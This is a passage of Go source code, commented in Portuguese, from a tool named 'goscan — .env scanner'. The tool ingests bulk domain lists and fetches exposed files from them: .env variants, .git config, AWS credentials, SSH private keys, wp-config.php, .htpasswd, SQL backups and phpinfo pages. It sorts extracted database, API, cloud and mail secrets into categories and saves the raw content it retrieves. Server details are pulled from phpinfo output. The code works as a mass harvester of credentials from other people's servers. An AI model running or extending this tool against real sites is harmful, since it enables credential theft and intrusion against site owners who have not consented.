	// Formato SSH com user específico: git@host:path
	// Isso não é credencial, é padrão SSH
	if strings.HasPrefix(url, "git@") {
		hasCredentials = false
		username = ""
	}

	return hasCredentials, username
}

// testGitRepoAccess testa se o repositório é acessível publicamente
func testGitRepoAccess(remoteURL string) (isPrivate bool, accessible bool) {
	if remoteURL == "" {
		return false, false
	}

	// Converte SSH URL para HTTPS para teste
	testURL := remoteURL
	if strings.HasPrefix(remoteURL, "git@") {
		// git@github.com:user/repo.git -> https://github.com/user/repo.git
		testURL = strings.Replace(remoteURL, "git@", "https://", 1)
		testURL = strings.Replace(testURL, ":", "/", 1)
	}

	// Remove credenciais da URL para teste público
	if strings.Contains(testURL, "@") && strings.Contains(testURL, "://") {
		afterProtocol := testURL[strings.Index(testURL, "://")+3:]
		if atIdx := strings.Index(afterProtocol, "@"); atIdx != -1 {
			host := afterProtocol[atIdx+1:]
			protocol := testURL[:strings.Index(testURL, "://")+3]
			testURL = protocol + host
		}
	}

	// Testa acesso público
	req, err := http.NewRequest("HEAD", testURL, nil)
	if err != nil {
		return true, false // Assume privado se não conseguir testar
	}
	req.Header.Set("User-Agent", "Mozilla/5.0")

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return true, false
	}
	defer resp.Body.Close()

	// 200 = público, 401/403/404 = privado ou não existe
	accessible = true
	isPrivate = resp.StatusCode != 200

	return isPrivate, accessible
}

// analyzePhpInfo extrai informações importantes do phpinfo()
func analyzePhpInfo(content string) *PhpInfo {
	info := &PhpInfo{
		RiskySettings:   make(map[string]string),
		Extensions:      []string{},
		Vulnerabilities: []string{},
	}

	// Extrai versão do PHP
	if m := regexp.MustCompile(`PHP Version</td><td class="v">([^<]+)`).FindStringSubmatch(content); len(m) > 1 {
		info.Version = strings.TrimSpace(m[1])
		if isVulnerablePhpVersion(info.Version) {
			info.Vulnerabilities = append(info.Vulnerabilities, fmt.Sprintf("PHP %s (EOL/CVEs)", info.Version))
		}
	}

	// Document Root
	if m := regexp.MustCompile(`DOCUMENT_ROOT</td><td class="v">([^<]+)`).FindStringSubmatch(content); len(m) > 1 {
		info.DocumentRoot = strings.TrimSpace(m[1])
		if strings.Contains(info.DocumentRoot, "/home/") {
			parts := strings.Split(info.DocumentRoot, "/")
			for i, p := range parts {
				if p == "home" && i+1 < len(parts) {
					info.User = parts[i+1]
					break
				}
			}
		}
	}

	// Server IP e nome
	if m := regexp.MustCompile(`SERVER_ADDR</td><td class="v">([^<]+)`).FindStringSubmatch(content); len(m) > 1 {
		info.ServerIP = strings.TrimSpace(m[1])
	}
	if m := regexp.MustCompile(`SERVER_NAME</td><td class="v">([^<]+)`).FindStringSubmatch(content); len(m) > 1 {
		info.ServerName = strings.TrimSpace(m[1])
	}

	// php.ini path
	if m := regexp.MustCompile(`Loaded Configuration File</td><td class="v">([^<]+)`).FindStringSubmatch(content); len(m) > 1 {
		info.PHPIniPath = strings.TrimSpace(m[1])
	}

	// Configurações perigosas
	dangerousSettings := map[string]string{
		`allow_url_include</td><td class="v">On`:       "allow_url_include=On",
		`display_errors</td><td class="v">On`:          "display_errors=On",
		`expose_php</td><td class="v">On`:              "expose_php=On",
		`register_globals</td><td class="v">On`:        "register_globals=On",
		`open_basedir</td><td class="v">no value`:      "open_basedir not set",
		`disable_functions</td><td class="v">no value`: "disable_functions not set",
	}

	for pattern, risk := range dangerousSettings {
		if regexp.MustCompile(pattern).MatchString(content) {
			info.RiskySettings[risk] = "ENABLED"
		}
	}

	// Upload settings
	if m := regexp.MustCompile(`file_uploads</td><td class="v">([^<]+)`).FindStringSubmatch(content); len(m) > 1 {
		if strings.TrimSpace(m[1]) == "On" {
			if m2 := regexp.MustCompile(`upload_max_filesize</td><td class="v">([^<]+)`).FindStringSubmatch(content); len(m2) > 1 {
				info.RiskySettings["file_uploads"] = fmt.Sprintf("On (max: %s)", strings.TrimSpace(m2[1]))
			}
		}
	}

	return info
}

func isVulnerablePhpVersion(version string) bool {
	parts := strings.Split(version, ".")
	if len(parts) < 2 {
		return false
	}
	majorMinor := parts[0] + "." + parts[1]
	// EOL versions
	vulnerable := map[string]bool{
		"5.2": true,
		"5.3": true,
		"5.4": true,
		"5.5": true,
		"5.6": true,
		"7.0": true,
		"7.1": true,
		"7.2": true,
		"7.3": true,
	}
	return vulnerable[majorMinor]
}

// extractEnvCredentials extrai e classifica credenciais de arquivos .env
func extractEnvCredentials(content string) *EnvCredentials {
	creds := &EnvCredentials{
		DatabaseCreds: make(map[string]string),
		APICreds:      make(map[string]string),
		CloudCreds:    make(map[string]string),
		MailCreds:     make(map[string]string),
		AppSecrets:    make(map[string]string),
		OtherSecrets:  make(map[string]string),
	}

	lines := strings.Split(content, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if idx := strings.Index(line, "="); idx > 0 {
			key := strings.TrimSpace(line[:idx])
			value := strings.TrimSpace(line[idx+1:])
			value = strings.Trim(value, `"'`)
			if value == "" || value == "null" || value == "empty" {
				continue
			}

			keyUpper := strings.ToUpper(key)

			switch {
			case strings.Contains(keyUpper, "DB_") || strings.Contains(keyUpper, "DATABASE") ||
				strings.Contains(keyUpper, "MYSQL") || strings.Contains(keyUpper, "POSTGRES") ||
				strings.Contains(keyUpper, "MONGO") || strings.Contains(keyUpper, "REDIS"):
				creds.DatabaseCreds[key] = maskCredential(value)
			case strings.Contains(keyUpper, "API") || strings.Contains(keyUpper, "KEY") ||
				strings.Contains(keyUpper, "TOKEN") || strings.Contains(keyUpper, "SECRET"):
				creds.APICreds[key] = maskCredential(value)
			case strings.Contains(keyUpper, "AWS") || strings.Contains(keyUpper, "AZURE") ||
				strings.Contains(keyUpper, "GCP") || strings.Contains(keyUpper, "S3") ||
				strings.Contains(keyUpper, "CLOUD"):
				creds.CloudCreds[key] = maskCredential(value)
			case strings.Contains(keyUpper, "MAIL") || strings.Contains(keyUpper, "SMTP") ||
				strings.Contains(keyUpper, "EMAIL") || strings.Contains(keyUpper, "SENDGRID"):
				creds.MailCreds[key] = maskCredential(value)
			case strings.Contains(keyUpper, "APP_") || strings.Contains(keyUpper, "JWT") ||
				strings.Contains(keyUpper, "ENCRYPT"):
				creds.AppSecrets[key] = maskCredential(value)
			case isSensitiveKey(keyUpper):
				creds.OtherSecrets[key] = maskCredential(value)
			}
		}
	}

	return creds
}

func isSensitiveKey(key string) bool {
	sensitivePatterns := []string{
		"PASSWORD", "PWD", "PASS", "SECRET", "PRIVATE", "TOKEN",
		"KEY", "CREDENTIAL", "AUTH", "CERTIFICATE", "CERT",
	}
	for _, pattern := range sensitivePatterns {
		if strings.Contains(key, pattern) {
			return true
		}
	}
	return false
}

func maskCredential(value string) string {
	if len(value) <= 4 {
		return "***"
	}
	if len(value) <= 8 {
		return value[:2] + strings.Repeat("*", len(value)-2)
	}
	return value[:4] + "..." + value[len(value)-2:]
}

func categorizeFile(path string) string {
	switch {
	case strings.Contains(path, "/.git/"):
		return "git"
	case strings.Contains(path, ".env"):
		return "env"
	case strings.Contains(path, "/.aws/"):
		return "aws"
	case strings.Contains(path, "/.ssh/"):
		return "ssh"
	case strings.Contains(path, "wp-"):
		return "wordpress"
	case strings.Contains(path, ".sql") || strings.Contains(path, "backup"):
		return "backup"
	case strings.Contains(path, "phpinfo") || strings.Contains(path, "info.php"):
		return "phpinfo"
	case strings.Contains(path, "config") || strings.Contains(path, "database.yml"):
		return "config"
	case strings.Contains(path, "credentials") || strings.Contains(path, "service-account"):
		return "credentials"
	case strings.Contains(path, ".log"):
		return "log"
	default:
		return "other"
	}
}

// savedFiles rastreia arquivos já salvos para evitar duplicação
var savedFiles = &sync.Map{}

func safeDomainName(domain string) string {
	s := strings.ReplaceAll(domain, ".", "_")
	return strings.ReplaceAll(s, ":", "_")
}

func envOutputFilename(domain, path string) string {
	safe := safeDomainName(domain)
	label := strings.TrimPrefix(path, "/")
	label = strings.NewReplacer("/", "_", ".", "_").Replace(label)
	if label == "" {
		label = "root"
	}
	return fmt.Sprintf("%s_%s.env", safe, label)
}

func saveFileContent(domain, path string, content []byte, url, confidence string, hasCredentials bool) string {
	if findingsStore == nil {
		return ""
	}
	fileKey := fmt.Sprintf("%s:%s", domain, path)
	if _, exists := savedFiles.LoadOrStore(fileKey, true); exists {
		return store.DomainFileName(domain, path)
	}
	_, rel, err := findingsStore.SaveFinding(domain, path, url, confidence, runID, content, hasCredentials)
	if err != nil {
		appLog.Printf("⚠️ Erro ao salvar finding %s: %v", domain, err)
		return ""
	}
	return rel
}

// getSpecificFilename retorna um nome de arquivo específico baseado no path
func getSpecificFilename(path string) string {
	switch {
	case strings.Contains(path, "/.git/config"):
		return "git_config.txt"
	case strings.Contains(path, "/.git/HEAD"):
		return "git_HEAD.txt"
	case strings.Contains(path, "/.git/index"):
		return "git_index.bin"
	case strings.Contains(path, "/.git/logs/HEAD"):
		return "git_logs_HEAD.txt"
	// .env variations - nomes específicos
	case strings.HasSuffix(path, "/.env") || path == "/env" || strings.HasSuffix(path, "/env"):
		return "env.txt"
	case strings.Contains(path, "/.env.local"):
		return "env_local.txt"
	case strings.Contains(path, "/.env.production") || strings.Contains(path, "/.env.prod"):
		return "env_production.txt"
	case strings.Contains(path, "/.env.development") || strings.Contains(path, "/.env.dev"):
		return "env_development.txt"
	case strings.Contains(path, "/.env.staging"):
		return "env_staging.txt"
	case strings.Contains(path, "/.env.testing") || strings.Contains(path, "/.env.test"):
		return "env_testing.txt"
	case strings.Contains(path, "/.env.backup") || strings.Contains(path, "/.env.bak"):
		return "env_backup.txt"
	case strings.Contains(path, "/.env.old"):
		return "env_old.txt"
	case strings.Contains(path, "/.env.save"):
		return "env_save.txt"
	case strings.Contains(path, "/.env.example") || strings.Contains(path, "/.env.sample") || strings.Contains(path, "/.env.dist"):
		return "env_example.txt"
	case strings.Contains(path, "env.php"):
		return "env.php"
	case strings.Contains(path, "env.json"):
		return "env.json"
	case strings.Contains(path, "/.aws/credentials"):
		return "aws_credentials.txt"
	case strings.Contains(path, "/.ssh/id_rsa"):
		return "ssh_id_rsa.txt"
	case strings.Contains(path, "wp-config.php"):
		return "wp-config.php"
	case strings.Contains(path, "phpinfo.php") || strings.Contains(path, "info.php"):
		return "phpinfo.html"
	case strings.Contains(path, ".sql"):
		base := filepath.Base(path)
		return base
	case strings.Contains(path, "database.yml"):
		return "database.yml"
	case strings.Contains(path, ".htpasswd"):
		return "htpasswd.txt"
	case strings.Contains(path, ".npmrc"):
		return "npmrc.txt"
	case strings.Contains(path, "credentials.json"):
		return "credentials.json"
	case strings.Contains(path, "service-account.json"):
		return "service-account.json"
	case strings.Contains(path, "error.log"):
		return "error.log"
	case strings.Contains(path, "debug.log"):
		return "debug.log"
	case strings.Contains(path, "laravel.log"):
		return "laravel.log"
	default:
		// Usa o nome do arquivo original
		base := filepath.Base(path)
		if base == "" || base == "." {
			return "unknown.txt"
		}
		return base
	}
}

func determineExtension(path string, content []byte) string {
	switch {
	case strings.Contains(path, ".env"):
		return ".env"
	case strings.Contains(path, "/.git/"):
		return ".txt"
	case strings.Contains(path, ".sql"):
		return ".sql"
	case strings.Contains(path, ".php"):
		return ".php"
	case strings.Contains(path, ".yml") || strings.Contains(path, ".yaml"):
		return ".yml"
	case strings.Contains(path, ".json"):
		return ".json"
	case strings.Contains(path, ".log"):
		return ".log"
	case strings.Contains(path, "backup.zip") || (len(content) > 2 && content[0] == 0x50 && content[1] == 0x4B):
		return ".zip"
	case strings.Contains(path, ".tar.gz") || (len(content) > 2 && content[0] == 0x1F && content[1] == 0x8B):
		return ".tar.gz"
	default:
		return ".txt"
	}
}

func logVulnResults(results <-chan VulnResult) {
	for result := range results {
		if result.Confidence == "HIGH" {
			logImportantFind(result)
			if currentCfg != nil && currentCfg.OnFound != nil {
				currentCfg.OnFound(result)
			}
		}
	}
}

func savePhpInfoAnalysis(filename string, info *PhpInfo) {
	if info == nil {
		return
	}

	if err := os.MkdirAll(filepath.Dir(filename), 0755); err != nil {
		return
	}

	var content strings.Builder
	content.WriteString("=== PHPINFO ANALYSIS ===\n\n")
	content.WriteString(fmt.Sprintf("PHP Version: %s\n", info.Version))
	content.WriteString(fmt.Sprintf("Document Root: %s\n", info.DocumentRoot))
	content.WriteString(fmt.Sprintf("Server IP: %s\n", info.ServerIP))
	content.WriteString(fmt.Sprintf("Server Name: %s\n", info.ServerName))
	content.WriteString(fmt.Sprintf("User: %s\n", info.User))
	content.WriteString(fmt.Sprintf("PHP.ini: %s\n\n", info.PHPIniPath))

	if len(info.Vulnerabilities) > 0 {
		content.WriteString("⚠️ VULNERABILITIES:\n")
		for _, v := range info.Vulnerabilities {
			content.WriteString(fmt.Sprintf("  - %s\n", v))
		}
		content.WriteString("\n")
	}

	if len(info.RiskySettings) > 0 {
		content.WriteString("🔴 RISKY SETTINGS:\n")
		for setting, status := range info.RiskySettings {
			content.WriteString(fmt.Sprintf("  - %s: %s\n", setting, status))
		}
		content.WriteString("\n")
	}

	if len(info.Extensions) > 0 {
		content.WriteString("📦 EXTENSIONS:\n")
		for _, ext := range info.Extensions {
			content.WriteString(fmt.Sprintf("  - %s\n", ext))
		}
	}

	_ = os.WriteFile(filename, []byte(content.String()), 0644)
}

func saveEnvCredentials(filename string, creds *EnvCredentials) {
	if creds == nil {
		return
	}

	if err := os.MkdirAll(filepath.Dir(filename), 0755); err != nil {
		return
	}

	var content strings.Builder
	content.WriteString("=== EXTRACTED CREDENTIALS ===\n")
	content.WriteString("Note: Values are partially masked for security\n\n")

	if len(creds.DatabaseCreds) > 0 {
		content.WriteString("🗄️ DATABASE CREDENTIALS:\n")
		for k, v := range creds.DatabaseCreds {
			content.WriteString(fmt.Sprintf("  %s = %s\n", k, v))
		}
		content.WriteString("\n")
	}

	if len(creds.APICreds) > 0 {
		content.WriteString("🔑 API CREDENTIALS:\n")
		for k, v := range creds.APICreds {
			content.WriteString(fmt.Sprintf("  %s = %s\n", k, v))
		}
		content.WriteString("\n")
	}

	if len(creds.CloudCreds) > 0 {
		content.WriteString("☁️ CLOUD CREDENTIALS:\n")
		for k, v := range creds.CloudCreds {
			content.WriteString(fmt.Sprintf("  %s = %s\n", k, v))
		}
		content.WriteString("\n")
	}

	if len(creds.MailCreds) > 0 {
		content.WriteString("📧 EMAIL CREDENTIALS:\n")
		for k, v := range creds.MailCreds {
			content.WriteString(fmt.Sprintf("  %s = %s\n", k, v))
		}
		content.WriteString("\n")
	}

	if len(creds.AppSecrets) > 0 {
		content.WriteString("🔐 APP SECRETS:\n")
		for k, v := range creds.AppSecrets {
			content.WriteString(fmt.Sprintf("  %s = %s\n", k, v))
		}
		content.WriteString("\n")
	}

	if len(creds.OtherSecrets) > 0 {
		content.WriteString("🔒 OTHER SECRETS:\n")
		for k, v := range creds.OtherSecrets {
			content.WriteString(fmt.Sprintf("  %s = %s\n", k, v))
		}
	}

	_ = os.WriteFile(filename, []byte(content.String()), 0644)
}

func sanitizePathForFilename(path string) string {
	path = strings.TrimSpace(path)
	path = strings.Trim(path, "/")
	if path == "" {
		return "root"
	}
	path = strings.ReplaceAll(path, "/", "_")
	path = strings.ReplaceAll(path, ".", "_")
	path = strings.ReplaceAll(path, "-", "_")
	return path
}

// ============================================================================
// PROGRESS REPORTING
// ============================================================================

func reportIngestProgress(ctx context.Context, stats *Stats) {
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			lines := atomic.LoadInt64(&stats.LinesProcessed)
			newD := atomic.LoadInt64(&stats.DomainsNew)
			skip := atomic.LoadInt64(&stats.DomainsSkipped)
			elapsed := time.Since(stats.StartTime)
			rate := 0.0
			if elapsed.Seconds() > 0 {
				rate = float64(lines) / elapsed.Seconds()
			}
			fmt.Fprintf(os.Stderr, "\r   ⏳ %d linhas | %d novos | %d já no DB | ⚡ %.0f/s   ",
				lines, newD, skip, rate)
		}
	}
}

func reportPipelineProgress(ctx context.Context, stats *Stats) {
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			lines := atomic.LoadInt64(&stats.LinesProcessed)
			newD := atomic.LoadInt64(&stats.DomainsNew)
			pending := atomic.LoadInt64(&stats.DomainsPending)
			scanSkip := atomic.LoadInt64(&stats.DomainsScanSkip)
			scanned := atomic.LoadInt64(&stats.DomainsScanned)
			vulns := atomic.LoadInt64(&stats.VulnsFound)
			elapsed := time.Since(stats.StartTime)
			lineRate := 0.0
			if elapsed.Seconds() > 0 {
				lineRate = float64(lines) / elapsed.Seconds()
			}
			fmt.Fprintf(os.Stderr, "\r   ⏳ %d linhas | %d novos | %d pendentes | %d scan skip | %d scaneados | %d vulns | ⚡ %.0f/s   ",
				lines, newD, pending, scanSkip, scanned, vulns, lineRate)
		}
	}
}

func reportVulnProgress(ctx context.Context, stats *Stats, total int, startTime time.Time) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			scanned := atomic.LoadInt64(&stats.DomainsScanned)
			found := atomic.LoadInt64(&stats.VulnsFound)

			if int(scanned) >= total {
				fmt.Println()
				return
			}

			elapsed := time.Since(startTime)
			percent := float64(scanned) / float64(total) * 100
			rate := 0.0
			eta := time.Duration(0)

			if elapsed.Seconds() > 0 {
				rate = float64(scanned) / elapsed.Seconds()
				if rate > 0 {
					eta = time.Duration(float64(total-int(scanned))/rate) * time.Second
				}
			}

			fmt.Printf("\r   📊 %d/%d (%.1f%%) | ✅ %d vulns | ⚡ %.1f/s | ⏱️ ETA: %v   ",
				scanned, total, percent, found, rate, eta.Round(time.Second))
		}
	}
}

// ============================================================================
// OUTPUT & DISPLAY
// ============================================================================

func printBanner() {
	fmt.Fprintln(os.Stderr, "🚀 goscan — .env scanner")
}

func printSeparator() {}

func printIngestStats(stats *Stats, totalInDB int64) {
	elapsed := time.Since(stats.StartTime)
	fmt.Fprintf(os.Stderr, "\n✅ Concluído em %v\n", elapsed.Round(time.Second))
	fmt.Fprintf(os.Stderr, "   linhas: %d | novos: %d | pendentes: %d | scan skip: %d | total DB: %d",
		stats.LinesProcessed, stats.DomainsNew, stats.DomainsPending, stats.DomainsScanSkip, totalInDB)
	if stats.DomainsScanned > 0 {
		fmt.Fprintf(os.Stderr, " | scaneados: %d | .env: %d", stats.DomainsScanned, stats.VulnsFound)
	}
	fmt.Fprintln(os.Stderr)
}

func printFinalSummary(baseDir string, saveContent bool) {
	fmt.Fprintf(os.Stderr, "📁 %s\n", baseDir)
}

func showTopDomains(domains map[string]bool, n int) {
	fmt.Printf("\n🌐 Primeiros %d domínios:\n", n)

	sorted := make([]string, 0, len(domains))
	for d := range domains {
		sorted = append(sorted, d)
	}
	sort.Strings(sorted)

	for i := 0; i < n && i < len(sorted); i++ {
		fmt.Printf("   %d. %s\n", i+1, sorted[i])
	}
}

func logImportantFind(result VulnResult) {
	file := filepath.Base(result.Filename)
	if file == "" {
		file = "—"
	}
	fmt.Fprintf(os.Stderr, "\n✅ .ENV  %s  →  %s\n", result.URL, file)
}

func debugFile(filename string) {
	fmt.Println("\n🔍 DEBUG: Mostrando conteúdo do primeiro arquivo:")
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("   Erro ao abrir: %v\n", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	linhas := 0
	for scanner.Scan() && linhas < 30 {
		linha := strings.TrimSpace(scanner.Text())
		if linha != "" && !strings.HasPrefix(linha, "#") {
			fmt.Printf("   %d: %s\n", linhas+1, linha)

			domains := reDomain.FindAllString(linha, -1)
			if len(domains) > 0 {
				fmt.Printf("     → Possíveis domínios: %v\n", domains)
			}
			linhas++
		}
	}
}
